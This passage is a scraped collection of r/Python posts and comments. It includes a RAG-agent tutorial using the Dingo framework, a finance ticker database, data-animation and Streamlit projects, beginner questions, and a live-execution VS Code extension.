        "https://azure.microsoft.com/en-us/blog/introducing-phi-3-redefining-whats-possible-with-slms/",
        "https://github.com/BeastByteAI/agent_dingo",
        "http://build.py/"
    ],
    "post_content": "Motivation\nChatbots are among the most popular applications of large language models (LLMs). Often, an LLM's internal knowledge base is adequate for answering users questions. However, in those cases, the model may generate outdated, incorrect, or too generic responses when specificity is expected. These challenges can be partially addressed by supplementing the LLM with an external knowledge base and employing the retrieval-augmented generation (RAG) technique.\nHowever, if user queries are complex, it may be necessary to break the task into several sub-parts. In such cases, relying solely on the RAG technique may not be sufficient, and the use of agents may be required.\nThe fundamental concept of agents involves using a language model to determine a sequence of actions (including the usage of external tools) and their order. One possible action could be retrieving data from an external knowledge base in response to a user's query. In this tutorial, we will develop a simple Agent that accesses multiple data sources and invokes data retrieval when needed. We will use a Dingo framework that allows the development of LLM pipelines and autonomous agents.\nRAG Agent Architecture and Technical Stack\nThe application will consist of the following components:\nStreamlit: provides a frontend interface for users to interact with a chatbot.\nFastAPI: facilitates communication between the frontend and backend.\nDingo Agent: agent powered by GPT-4 Turbo model from OpenAI that has access to provided knowledge bases and invokes data retrieval from them if needed.\nLLMs docs: a vector store containing documentation about the recently released Phi-3 (from Microsoft) and Llama 3 (from Meta) models.\nAudio gen docs: a vector store containing documentation about the recently released OpenVoice model from MyShell.\nEmbedding V3 small model from OpenAI: computes text embeddings.\nQDrant: vector database that stores embedded chunks of text.\nImplementation\nStep 0:\nInstall the Dingo framework:\npip install agent-dingo\nSet the OPENAI_API_KEY environment variable to your OpenAI API key:\nexport OPENAI_API_KEY=your-api-key\nStep 1:\nCreate a component.py file, and initialize an embedding model, a chat model, and two vector stores: one for storing documentation of Llama 3 and Phi-3, and another for storing documentation of OpenVoice.\n# component.py\nfrom agent_dingo.rag.embedders.openai import OpenAIEmbedder\nfrom agent_dingo.rag.vector_stores.qdrant import Qdrant\nfrom agent_dingo.llm.openai import OpenAI\n\n# Initialize an embedding model\nembedder = OpenAIEmbedder(model=\"text-embedding-3-small\")\n\n# Initialize a vector store with information about Phi-3 and Llama 3 models\nllm_vector_store = Qdrant(collection_name=\"llm\", embedding_size=1536, path=\"./qdrant_db_llm\")\n\n# Initialize a vector store with information about OpenVoice model\naudio_gen_vector_store = Qdrant(collection_name=\"audio_gen\", embedding_size=1536, path=\"./qdrant_db_audio_gen\")\n\n# Initialize an LLM\nllm = OpenAI(model = \"gpt-3.5-turbo\")\nStep 2:\nCreate a build.py file. Parse, chunk into smaller pieces, and embed websites containing documentation of the above-mentioned models. The embedded chunks are used to populate the corresponding vector stores.\n# build.py\nfrom components import llm_vector_store, audio_gen_vector_store, embedder\nfrom agent_dingo.rag.readers.web import WebpageReader\nfrom agent_dingo.rag.chunkers.recursive import RecursiveChunker\n\n# Read the content of the websites\nreader = WebpageReader()\nphi_3_docs = reader.read(\"https://azure.microsoft.com/en-us/blog/introducing-phi-3-redefining-whats-possible-with-slms/\")\nllama_3_docs = reader.read(\"https://ai.meta.com/blog/meta-llama-3/\")\nopenvoice_docs = reader.read(\"https://research.myshell.ai/open-voice\")\n\n# Chunk the documents\nchunker = RecursiveChunker(chunk_size=512)\nphi_3_chunks = chunker.chunk(phi_3_docs)\nllama_3_chunks = chunker.chunk(llama_3_docs)\nopenvoice_chunks = chunker.chunk(openvoice_docs)\n\n# Embed the chunks\nfor doc in [phi_3_chunks, llama_3_chunks, openvoice_chunks]:\n    embedder.embed_chunks(doc)\n\n# Populate LLM vector store with embedded chunks about Phi-3 and Llama 3\nfor chunk in [phi_3_chunks, llama_3_chunks]:\n    llm_vector_store.upsert_chunks(chunk)\n\n# Populate audio gen vector store with embedded chunks about OpenVoice\naudio_gen_vector_store.upsert_chunks(openvoice_chunks)\nRun the script:\npython build.py\nAt this step, we have successfully created vector stores.\nStep 3:\nCreate serve.py file, and build a RAG pipeline. To access the pipeline from the Streamlit application, we can serve it using the serve_pipeline function, which provides a REST API compatible with the OpenAI API.\n# serve.py\nfrom agent_dingo.agent import Agent\nfrom agent_dingo.serve import serve_pipeline\nfrom components import llm_vector_store, audio_gen_vector_store, embedder, llm\n\nagent = Agent(llm, max_function_calls=3)\n\n# Define a function that an agent can call if needed\nu/agent.function\ndef retrieve(topic: str, query: str) -> str:\n    \"\"\"Retrieves the documents from the vector store based on the similarity to the query.\n    This function is to be used to retrieve the additional information in order to answer users' queries.\n\n    Parameters\n    ----------\n    topic : str\n        The topic, can be either \"large_language_models\" or \"audio_generation_models\".\n        \"large_language_models\" covers the documentation of Phi-3 family of models from Microsoft and Llama 3 model from Meta.\n        \"audio_generation_models\" covers the documentation of OpenVoice voice cloning model from MyShell.\n        Enum: [\"large_language_models\", \"audio_generation_models\"]\n    query : str\n        A string that is used for similarity search of document chunks.\n\n    Returns\n    -------\n    str\n        JSON-formatted string with retrieved chunks.\n    \"\"\"\n    print(f'called retrieve with topic {topic} and query {query}')\n    if topic == \"large_language_models\":\n        vs = llm_vector_store\n    elif topic == \"audio_generation_models\":\n        vs = audio_gen_vector_store\n    else:\n        return \"Unknown topic. The topic must be one of `large_language_models` or `audio_generation_models`\"\n    query_embedding = embedder.embed(query)[0]\n    retrieved_chunks = vs.retrieve(k=5, query=query_embedding)\n    print(f'retrieved data: {retrieved_chunks}')\n    return str([chunk.content for chunk in retrieved_chunks])\n\n# Create a pipeline\npipeline = agent.as_pipeline()\n\n# Serve the pipeline\nserve_pipeline(\n    {\"gpt-agent\": pipeline},\n    host=\"127.0.0.1\",\n    port=8000,\n    is_async=False,\n)\nRun the script:\npython serve.py\nAt this stage, we have an openai-compatible backend with a model named gpt-agent, running on http://127.0.0.1:8000/. The Streamlit application will send requests to this backend.\nStep 4:\nCreate app.py file, and build a chatbot UI:\n# app.py\nimport streamlit as st\nfrom openai import OpenAI\n\nst.title(\"🦊 Agent\")\n\n# provide any string as an api_key parameter\nclient = OpenAI(base_url=\"http://127.0.0.1:8000\", api_key=\"123\")\n\nif \"openai_model\" not in st.session_state:\n    st.session_state[\"openai_model\"] = \"gpt-agent\"\nif \"messages\" not in st.session_state:\n    st.session_state.messages = []\n\nfor message in st.session_state.messages:\n    avatar = \"🦊\" if message[\"role\"] == \"assistant\" else \"👤\"\n    with st.chat_message(message[\"role\"], avatar=avatar):\n        st.markdown(message[\"content\"])\n\nif prompt := st.chat_input(\"How can I assist you today?\"):\n    st.session_state.messages.append({\"role\": \"user\", \"content\": prompt})\n    with st.chat_message(\"user\", avatar=\"👤\"):\n        st.markdown(prompt)\n\n    with st.chat_message(\"assistant\", avatar=\"🦊\"):\n        stream = client.chat.completions.create(\n            model=st.session_state[\"openai_model\"],\n            messages=[\n                {\"role\": m[\"role\"], \"content\": m[\"content\"]}\n                for m in st.session_state.messages\n            ],\n            stream=False,\n        )\n        response = st.write_stream((i for i in stream.choices[0].message.content))\n    st.session_state.messages.append({\"role\": \"assistant\", \"content\": response})\nRun the application:\nstreamlit run app.py\n🎉 We have successfully built an Agent that is augmented with the technical documentation of several newly released generative models and can retrieve information from these documents if necessary. Let’s ask some technical questions, and check the generated output:\nConclusion\nIn this tutorial, we have developed a RAG agent that can access external knowledge bases, selectively decide whether to access the external data, which data source to use (and how many times), and how to rewrite the user's query before retrieving the data.\nIt can be seen that the Dingo framework enhances the development of LLM-based applications by allowing developers to quickly and easily create application prototypes.",
    "comments": [
        {
            "author": "Immediate-Pay4606",
            "score": "1",
            "content": "Hi! Has anyone resolved this problem? python build.py Traceback (most recent call last): File \"C:\\LLM\\RAG\\build.py\", line 3, in <module> from components import llm_vector_store, audio_gen_vector_store, embedder ModuleNotFoundError: No module named 'components'"
        }
    ]
},
{
    "post_author": "Traditional_Yogurt",
    "post_id": "lcexoa",
    "post_score": "2242",
    "post_time": "Thursday, February 4, 2021 at 3:49:24 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "I made a Finance Database with over 180.000 tickers to make Investment Decisions easier",
    "media": [
        "https://github.com/JerBouma/FinanceDatabase",
        "https://github.com/JerBouma/FundamentalAnalysis",
        "https://github.com/sec-edgar/sec-edgar",
        "https://github.com/ranaroussi/yfinance",
        "https://github.com/JerBouma/FinanceDatabase#Examples",
        "https://github.com/JerBouma/FinanceDatabase/tree/master/Database"
    ],
    "post_content": "In my spare time I like to go through financial data to understand what kind of companies exist, how sectors and industries evolve and to test theoretical frameworks. However, I found that it required a lot of effort to figure out which companies belong to which industry and I often ran into paywalls that blocked me from accessing the exact data I was looking for. Platforms like Bloomberg offer such services but at ridiculous prices (up to $24.000 a year). This can make investment decisions for the retail investor rather difficult especially if you don't want to follow 'the herd'. I wanted to change that.\nInsert the FinanceDatabase. A database of over 180.000 symbols (80k+ companies, 15k+ ETFs, 30k+ Funds, 3k+ Cryptocurrencies and more) that is fully categorised per country, industry, sector, category and more. It features a 'Searcher' package (pip install FinanceDatabase) that has a user-friendly way of collecting the exact data you want (downloaded straight from the repository). For example, the following code returns all (listed) airlines in the United States (check Examples for more info) :\nimport FinanceDatabase as fd\n\nairlines_us = fd.select_equities(country='United States', industry='Airlines')\nAnd the following gives insights in ETFs that have anything to do with 'semiconductor':\nimport FinanceDatabase as fd\n\nall_etfs = fd.select_etfs()\nsemiconductor_etfs = fd.search_products(all_etfs, 'semiconductor')\nWhat I explicitly am not trying to do is re-invent the wheel (again) of Fundamental Data gathering as there are tons of packages out there that do that already (i.e. FundamentalAnalysis, yfinance, sec-edgar) but instead allow you to capture sector, industries, specific types of ETFs or cryptocurrencies that would have otherwise resulted in a lot of manual work. Then, when you have this sub-selection you can make use of the earlier mentioned packages.\nIf you want to know what is available inside the Database, please have a look here. Alternatively, you can do the following (an example):\nimport FinanceDatabase as fd\n\nequities_countries = fd.show_options('equities','countries') # or sector/industry\netfs_categories = fd.show_options('etfs')\ncryptocurrencies = fd.show_options('cryptocurrencies')\nI hope this can help some of you out making (better) investment decisions and all feedback (positive and negative) and contribution is much appreciated.\nEDIT: Thanks for the rewards and kind words everyone!",
    "comments": [
        {
            "author": "vabruce",
            "score": "217",
            "content": "I love just scanning reddit and then, bam, something really neat and useful. Well done!",
            "replies": [
                {
                    "author": "fraud_93",
                    "score": "31",
                    "content": "I feel so happy when I find something that is not a new model of blog, file manager... Usually I see new programmers claiming they can't find people to contribute, this is the kind of project I would gladly help if needed."
                },
                {
                    "author": "420spark",
                    "score": "7",
                    "content": "Same last week someone posted a data analysis tool that analyzed Twitter feeds and stock market correlations and im mad I didn't save it cause I can't find it anymore.",
                    "replies": [
                        {
                            "author": "boomjynx-",
                            "score": "3",
                            "content": "Not sure if its this one? This is reddit threads, not twitter as you mentioned... https://unbiastock.com/"
                        }
                    ]
                }
            ]
        },
        {
            "author": "LukePfaff",
            "score": "46",
            "content": "This isn’t what we asked for, but it’s what we needed!!"
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "Hmm that makes a lot of sense. Any legal issues for me personally? Otherwise I need to rethink if I want to keep this database up or not.",
            "replies": [
                {
                    "author": "Traditional_Yogurt",
                    "score": "27",
                    "content": "Hmm that makes a lot of sense. Any legal issues for me personally? Otherwise I need to rethink if I want to keep this database up or not."
                }
            ]
        },
        {
            "author": "jmarke17",
            "score": "20",
            "content": "Great work! 👏🏻👏🏻"
        }
    ]
},
{
    "post_author": "PieChartPirate",
    "post_id": "1cu4epm",
    "post_score": "20",
    "post_time": "Friday, May 17, 2024 at 3:53:26 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "sjvisualizer: a python package to animate time-series data",
    "media": [
        "https://www.sjdataviz.com/software",
        "https://github.com/SjoerdTilmans/sjvisualizer"
    ],
    "post_content": "What the project does: data animation library for time-series data. Currently it supports the following chart types:\nBar races\nAnimated Pie Charts\nAnimated Line Charts\nAnimated Stacked Area Charts\nAnimated (World) Maps\nYou can find some simple example charts here: https://www.sjdataviz.com/software\nIt is on pypi, you can install it using:\npip install sjvisualizer\nIt is fully based on TkInter to draw the graph shapes to the screen, which gives a lot of flexibility. You can also mix and match the different chart types in a single animation.\nTarget audience: people interested in data animation for presentations or social media content creation\nAlternatives: I only know one alternative which is bar-chart-race, the ways sjvisualizer is better:\nSmoother animation, bar-chart-race isn't the quite choppy I would say\nLoad custom icons for each data category (flag icons for countries for example)\nNumber of supported chart types\nMix and match different chart types in a single animation, have a bar race to show the ranking, and a smaller pie chart showing the percentages of the whole\nBased on TkInter, easy to add custom elements through the standard python GUI library\nTopics to improve (contributions welcome):\nDocumentation\nImprove built in screen recorder, performance takes a hit when using the built in screen recorder\nAdditional chart types: bubble charts, lollipop charts, etc\nImprove the way data can be loaded into the library (currently only supports reading into a dataframe from Excel)\nSorry for the long post, you can find it here on GitHub: https://github.com/SjoerdTilmans/sjvisualizer",
    "comments": [
        {
            "author": "Desperate_Cold6274",
            "score": "1",
            "content": "As another alternative let me cite manim (btw so far I know there are only few contributors if anyone is seeking any cool projects to contribute). Other than that: nice project!"
        }
    ]
},
{
    "post_author": "[deleted]",
    "post_id": "fpvay3",
    "post_score": "2164",
    "post_time": "Friday, March 27, 2020 at 2:26:26 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Boids - organic motion from 3 simple rules",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "158",
            "content": "This is one of the rendering of my recent project: Boids. Source code can be found here. Inspired by Code Parade's video. Here's u/Ph0X's interactive browser version :)",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "I'm interested in the theory behind this. What is the field of study?",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "16",
                            "content": "I'm interested in the theory behind this. What is the field of study?"
                        }
                    ]
                },
                {
                    "author": "renaissancenow",
                    "score": "13",
                    "content": "Thanks! Just read through the source code; it was very instructive. It's practically a tutorial.",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "3",
                            "content": "Thank you! :)"
                        }
                    ]
                },
                {
                    "author": "TackoFell",
                    "score": "5",
                    "content": "Would be cool to program in a couple “herding dogs”",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "6",
                            "content": "That would indeed be nice, go ahead and do it! :)"
                        }
                    ]
                },
                {
                    "author": "AGI_69",
                    "score": "2",
                    "content": "Why do you use GitLab ? Just curious",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "22",
                            "content": "Dunno.. made the switch when Microsoft bought GitHub. Also because GitLab is FOSS, and maybe for the automatic CI/CD, which GitHub didn't have when MS acquired it and which I might use someday (hopefully)"
                        },
                        {
                            "author": "grudev",
                            "score": "7",
                            "content": "Not OP, but Gitlab is awesome. I made the switch before GitHub started allowing private repos (GitLab does not limit the number of repos or collaborators). It made even more sense after I started using CI/CD and dockerizing my apps."
                        },
                        {
                            "author": "c3534l",
                            "score": "1",
                            "content": "People doing DevOps seem to love GitLab. It's more of an automated code deployment environment that happens to also host code than it is a collection of public gits."
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "46",
            "content": "What are the rules?"
        },
        {
            "author": "MyreMyalar",
            "score": "46",
            "content": "Very relaxing to watch."
        },
        {
            "author": "Fun-Visual-School",
            "score": "7",
            "content": "Excellent results. Although they seem at times too eager to spread around equally. It looks unnatural a bit. If you have other intriguing visual demos please consider sharing them in r/VisualSchool. Cheers!"
        },
        {
            "author": "RGerdedgit",
            "score": "2",
            "content": "u/vredditdownloader"
        },
        {
            "author": "[deleted]",
            "score": "2",
            "content": "Neat! Thanks for sharing this. A few questions and comments: Why the walrus operator? Does it serve a functional purpose or did you just want to try it out? On Ubuntu 18.04, the screen size defaults to something larger than full screen. The exit button does nothing, I had to kill it with Ctrl-C"
        },
        {
            "author": "crazypistolman",
            "score": "2",
            "content": "I would love to see \"air resistance\" added."
        },
        {
            "author": "wizcheez",
            "score": "2",
            "content": "This would totally make for a super cool digital art piece."
        }
    ]
},
{
    "post_author": "These_Shoe3594",
    "post_id": "1ctxzhj",
    "post_score": "1",
    "post_time": "Friday, May 17, 2024 at 8:50:45 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "What changes needs to be done when I change the version of Wergzeug from 2.3.8 to 3.0.0 ?",
    "media": [],
    "post_content": "What are all the changes needs to be done when I change the version of Wergzeug from 2.3.8 to 3.0.0 ?\nThere are some CVE fixes available in the latest 3.x version of werkzueg. To take the fixes as part of my code, we want to upgrade the version. When I do so, I’ve faced lot of breakages. I found some on documents and release notes. But it would be easier if someone already did some changes regarding this.",
    "comments": [
        {
            "author": "riklaunim",
            "score": "3",
            "content": "You likely have to upgrade versions of packages that use it directly like flask and work out from there."
        },
        {
            "author": "nekokattt",
            "score": "2",
            "content": "Have you tried updating locally and seeing which tests fail? That is a good starting point..",
            "replies": [
                {
                    "author": "These_Shoe3594",
                    "score": "1",
                    "content": "I’ve tried upgrading it. It broke plenty of other things. When I updated those packages, my functionality broke 😬😬. Need to spend a lot time with it to get it working."
                }
            ]
        },
        {
            "author": "yrubooingmeimryte",
            "score": "1",
            "content": "r/learnpython"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cs75gc",
    "post_score": "5",
    "post_time": "Wednesday, May 15, 2024 at 3:00:10 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Wednesday Daily Thread: Beginner questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "kevkaalil",
            "score": "2",
            "content": "If I'm coding a script to be ran on a separate computer, and the script relies on something I have to import from a library-- do I need to install and import on the computer that's going to run it or can I just do that from my coding pc?",
            "replies": [
                {
                    "author": "riklaunim",
                    "score": "5",
                    "content": "System that will be running the code needs all the dependencies."
                },
                {
                    "author": "dhsjabsbsjkans",
                    "score": "1",
                    "content": "Maybe look at https://beeware.org/"
                }
            ]
        },
        {
            "author": "AstronomerTerrible49",
            "score": "2",
            "content": "Do pythons have venom?",
            "replies": [
                {
                    "author": "riklaunim",
                    "score": "3",
                    "content": "No venom, no semicolon."
                }
            ]
        },
        {
            "author": "OtherwiseAd4345",
            "score": "1",
            "content": "Why might converting a list to a set and then checking that the length of the set is 1 not give the same result as iterating over the list to check if all elements are the same? Approach 1: def all_equal(l): return len(set(l)) == 1 Approach 2: def all_equal(l): for i in range(len(l)-1): if l[i] != l[i+1]: return False return True Only the latter was correct.",
            "replies": [
                {
                    "author": "JamzTyson",
                    "score": "1",
                    "content": "If l is an empty list, Approach 1 returns False and Approach 2 returns True. Also, sets can only be used with hashable types. It is also possible that some custom class objects may behave differently when comparing the hash value vs comparing equality. A silly example of this: def all_equal1(l): \"\"\"Version 1\"\"\" return len(set(l)) == 1 def all_equal2(l): \"\"\"Version 2\"\"\" for i in range(len(l)-1): if l[i] != l[i+1]: return False return True class Test: def __init__(self, x): self.x = x def __eq__(self, other): return isinstance(other, Test) def __hash__(self): return hash(self.x) x = Test(3) y = Test(4) test_list = [x, y] print(all_equal1(test_list))  # False print(all_equal2(test_list))  # True"
                }
            ]
        }
    ]
},
{
    "post_author": "jgloewen",
    "post_id": "1cuyivc",
    "post_score": "68",
    "post_time": "Saturday, May 18, 2024 at 5:27:56 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Tutorial: Simple Pretty Maps That Will Improve Your Python Streamlit Skills",
    "media": [
        "https://johnloewen.substack.com/p/simple-pretty-maps-that-will-better"
    ],
    "post_content": "Interactive web applications for data visualization improve user engagement and understanding.\nThese days, Streamlit is a very popular framework used to provide web applications for data science.\nIt is a terrific programming tool to have in you Python knowledge toolbox.\nHere’s a fun and practical tutorial on how to create a simple interactive and dynamic Streamlit application.\nThis application generates a beautiful and original map using the prettymaps library.\nFree article: HERE",
    "comments": [
        {
            "author": "Traditional_Parking6",
            "score": "10",
            "content": "How can streamlit apps be used commercially? Has anyone had any experience at implementing them? Are there other ways to host other than via streamlit / what about from a cybersecurity perspective?",
            "replies": [
                {
                    "author": "IronRocketCpp",
                    "score": "2",
                    "content": "This framework is best for personal projects or rapid prototyping. The corporate world is slow to pick up new technologies.",
                    "replies": [
                        {
                            "author": "BurningSquid",
                            "score": "3",
                            "content": "The corporate world is only slow when it's not useful for generating actual value"
                        },
                        {
                            "author": "scarfarce",
                            "score": "2",
                            "content": "Yeah, that's what I thought, but then https://streamlit.io/ says: Trusted by over 80% of Fortune 50 companies"
                        }
                    ]
                }
            ]
        },
        {
            "author": "TTechTex",
            "score": "4",
            "content": "I work a lot in streamlit. Wish the sub was more active. I'm hoping that they will enable more interactive graphs with plotly soon.",
            "replies": [
                {
                    "author": "jgloewen",
                    "score": "1",
                    "content": "I think it's becoming more active. And yes, more Plotly would be great. I really enjoy working with the plotly library as well."
                },
                {
                    "author": "jgloewen",
                    "score": "1",
                    "content": "And thank you for the comment - much appreciated!"
                }
            ]
        },
        {
            "author": "IronRocketCpp",
            "score": "3",
            "content": "This is an exceptionally simple and easy way to build a python application. Just the interactive graphs alone are enticing enough for me. Just a note, its best for rapid prototyping but gives up customizability. Its very noob friendly and the website offers a interactive way to learn its uses, website, github.",
            "replies": [
                {
                    "author": "jgloewen",
                    "score": "2",
                    "content": "Thanks for the props! And it's just fun to get visual results like this from an inclusive programming tutorial."
                }
            ]
        },
        {
            "author": "edcculus",
            "score": "2",
            "content": "Thanks, I’m going to go through this .",
            "replies": [
                {
                    "author": "jgloewen",
                    "score": "1",
                    "content": "Let me know how it goes!"
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cuk3zp",
    "post_score": "0",
    "post_time": "Saturday, May 18, 2024 at 3:00:12 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Saturday Daily Thread: Resource Request and Sharing! Daily Thread",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "yngwieHero",
    "post_id": "1ctnxa4",
    "post_score": "5",
    "post_time": "Friday, May 17, 2024 at 12:06:10 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Langchain using llama3 to build recommendation system",
    "media": [
        "https://github.com/lukaszksiezak/ScrapyToLLM",
        "https://lukaszksiezak.github.io/ScrapyToLLM/"
    ],
    "post_content": "Hi,\nRecently I played a bit with LLMs, specifcally exploring ways of running the models locally and building prompts using LangChain. As a result ended up coding a small recommendation system, powered with Llama3-7b model, which suggests topics to read on HackerNews.\nWanted to share my experiences, so I wrote a small article where I described all my findings.\nHope you'll like it: https://lukaszksiezak.github.io/ScrapyToLLM/\nGithub repo: https://github.com/lukaszksiezak/ScrapyToLLM\nWhat the project does:\nIt's a Python application which uses scrapy to scrape HackerNews page. Scraped articles are pipelined to redis, which is then feeding Llama3 using langchain. Prompter is configured to serve a user articles which are matching his request.\nTarget Audience:\nI think it suits the best all the people who are looking for a Hello World projects using LLMs. I think it also reveals some difficulties related to LLM tech, what potential problems could be found in production systems.\nComparison:\nRecommendation systems are widely used and known, however LLMs are the ones which may work out of the box when appropriate prompt is given. It's kind of interesting to explore various usages of the technology and take part in fast grow of that stack.\nCheers.",
    "comments": [
        {
            "author": "Lenmenice",
            "score": "3",
            "content": "Great work!"
        }
    ]
},
{
    "post_author": "HP7933",
    "post_id": "1cu5m68",
    "post_score": "5",
    "post_time": "Friday, May 17, 2024 at 4:46:52 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "The Python on Microcontrollers (and Raspberry Pi) Newsletter, a weekly news and project resource",
    "media": [
        "https://www.adafruitdaily.com/"
    ],
    "post_content": "The Python on Microcontrollers (and Raspberry Pi) Newsletter: subscribe for free\nWith the Python on Microcontrollers newsletter, you get all the latest information on Python running on hardware in one place! MicroPython, CircuitPython and Python on single Board Computers like Raspberry Pi & many more.\nThe Python on Microcontrollers newsletter is the place for the latest news. It arrives Monday morning with all the week’s happenings. No advertising, no spam, easy to unsubscribe.\n10,998 subscribers - the largest Python on hardware newsletter out there. (2 more for 11k!)\nCatch all the weekly news on Python for Microcontrollers with adafruitdaily.com.\nThis ad-free, spam-free weekly email is filled with CircuitPython, MicroPython, and Python information that you may have missed, all in one place!\nEnsure you catch the weekly Python on Hardware roundup– you can cancel anytime – try our spam-free newsletter today!\nhttps://www.adafruitdaily.com/",
    "comments": []
},
{
    "post_author": "MohamedElfatih",
    "post_id": "1cvk87v",
    "post_score": "2",
    "post_time": "Sunday, May 19, 2024 at 12:16:46 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Interactive 8-Puzzle Game ",
    "media": [
        "https://github.com/mohammedElfatihSalah/8-Puzzle-Solver"
    ],
    "post_content": "What does my project do\nHi everyone\nI’m excited to share a project I’ve been working on: an interactive 8-puzzle game built using Python and Pygame. This project also includes several solvers based on classic search algorithms.\nTechnical details:\nPython: the primary language in the project.\nPygame: for rendering and handling user interaction.\nSearch algorithms: implement depth first search (dfs) and A star search for solving the puzzle. By default A star search is used because it finds the solution faster than dfs\nTarget Audience\nThis is a toy project I did for fun. You can find the project in GitHub: link\nI would love to get your feedback, contributions, and if you find it interesting or helpful, please give it a star on GitHub. Your support and feedback will help me improve and add more features!Thank you for checking out my project!",
    "comments": [
        {
            "author": "FullReality169",
            "score": "1",
            "content": "hi, thanks for your project, i was trying to run your code on Visual Studio but i met this error problem: Exception has occurred: ImportError cannot import name 'solver_lib' from 'eight_puzzle' (unknown location) would u mind to help to solve it, i would appreciated alot",
            "replies": [
                {
                    "author": "MohamedElfatih",
                    "score": "1",
                    "content": "Sure, I looked into the code and I actually found a bug and some issues with the README, so thanks so much for raising this. I resolved those issues and updated the repo, so please clone the code again and this time when you are executing main.py use the following command: python -m eight_puzzle.main Please let me know how it goes"
                }
            ]
        }
    ]
},
{
    "post_author": "AbhishekSuryavanshee",
    "post_id": "1csjh1d",
    "post_score": "0",
    "post_time": "Wednesday, May 15, 2024 at 3:21:59 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Interactive Data Visualization with Python: A Showcase of Plotly Dash",
    "media": [
        "https://www.aspiresoftserv.com/",
        "https://github.com/yourusername/plotly-dash-interactive-viz"
    ],
    "post_content": "What My Project Does:\nI'm excited to introduce my latest project built with Python – an interactive data visualization application using Plotly Dash. This project aims to empower users to explore and analyze datasets dynamically through interactive visualizations. By leveraging Plotly Dash's capabilities, users can interact with data in real-time, customize visualizations on the fly, and gain deeper insights with just a few clicks.\nTarget Audience:\nThis project caters to a wide range of users, from data enthusiasts and analysts to professionals seeking to communicate insights effectively. Whether you're a data scientist exploring patterns in large datasets or a business analyst presenting findings to stakeholders, this tool is designed to streamline your workflow and enhance your data storytelling capabilities. It's suitable for both production-grade applications and educational purposes, offering a versatile platform for data visualization tasks of varying complexity.\nComparison:\nUnlike traditional static charts or cumbersome data exploration tools, this Plotly Dash application stands out for its interactivity and flexibility. While existing alternatives may offer basic charting functionalities, they often lack the dynamic capabilities required for in-depth data exploration. With Plotly Dash, users can manipulate charts in real-time, zoom in on specific data points, filter datasets dynamically, and even integrate interactive components like dropdowns and sliders for a more immersive experience. This project takes data visualization to the next level by providing a user-friendly interface coupled with powerful interactivity, setting it apart as a top choice for visualizing and analyzing datasets.\nSource Code:\nYou can access the source code for this project on GitHub: Interactive Data Visualization with Plotly Dash\nWebsite:\nFor more information and to see the project in action, visit : https://www.aspiresoftserv.com/",
    "comments": [
        {
            "author": "Critical_Concert_689",
            "score": "7",
            "content": "https://github.com/yourusername/plotly-dash-interactive-viz 404."
        },
        {
            "author": "Old_Transition_3884",
            "score": "4",
            "content": "GitHub link not working"
        }
    ]
},
{
    "post_author": "dadadidi",
    "post_id": "hd6l9t",
    "post_score": "2145",
    "post_time": "Sunday, June 21, 2020 at 4:03:00 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "A VS Code extension that displays the values of variables while you type",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "FMlMo0dy",
            "score": "60",
            "content": "What happens if your program does something destructive? E.g. write to a file? Is that also executed?",
            "replies": [
                {
                    "author": "dadadidi",
                    "score": "19",
                    "content": "The extension doesn't allow you to delete folders. So for anything where you want to create or delete folders its not really suited :) But you can stop real-time execution for a code block by adding #$save after it (e.g. for a request or writing to a file)",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "47",
                            "content": "This would be far more useful if it blocked any file write operations by default"
                        },
                        {
                            "author": "the_pw_is_in_this_ID",
                            "score": "11",
                            "content": "OP, you should also prevent this extension from interacting with anything outside of the Python environment - no HTTP transactions, no file interactions, no calls through USB bus, nothing. All of these are more than a little bit dangerous."
                        },
                        {
                            "author": "t3hcoolness",
                            "score": "6",
                            "content": "So to prevent something from running, you have to add something after you've typed it and it ran? 🤔"
                        }
                    ]
                }
            ]
        },
        {
            "author": "VepnarNL",
            "score": "159",
            "content": "For what would this be useful? And what about huge projects? Anyway, really cool project!"
        },
        {
            "author": "dadadidi",
            "score": "77",
            "content": "This VS Code extension executes your python code while you are still typing. It also shows you intermediate values, whenever a variable is declared or changed, even within loops. You can get the extension here I'd love to get some feedback from you :) I madethis extension to save time while debugging. Usually you have to step through each line with a debugger or add print statements to analyze a bug. Also you have to run the file again after each small change, to see if your change worked. With the variable display of LiveCode, you immediatly see if there is something wrong and you can fix it."
        },
        {
            "author": "R3HAT1N0",
            "score": "25",
            "content": "So this is Swift Playgrounds for Python. Nice"
        },
        {
            "author": "Pand9",
            "score": "17",
            "content": "I think this is good for interactive sessions. Better than both \"type directly into console\" and \"use reusable jupyter cells\" approaches, at a first sight at least. I would like to have it at work. A great idea, congratulations. Did you derive it from some other IDE? Does Pycharm do something similar?"
        },
        {
            "author": "leo848blume",
            "score": "8",
            "content": "I use AREPL a lot. Is there any difference?"
        },
        {
            "author": "Semicolon2112",
            "score": "5",
            "content": "I absolutely love seeing that Python programmers are adopting VS Code. Love this IDE so much. I love the idea of this extension too, feels like one of the things that's missing from other lightweight IDEs like IDLE/IDLEX. To me, this shows off the potential of that VS Code has as it gets adopted by more and more communities. Well done!"
        },
        {
            "author": "arsewarts1",
            "score": "6",
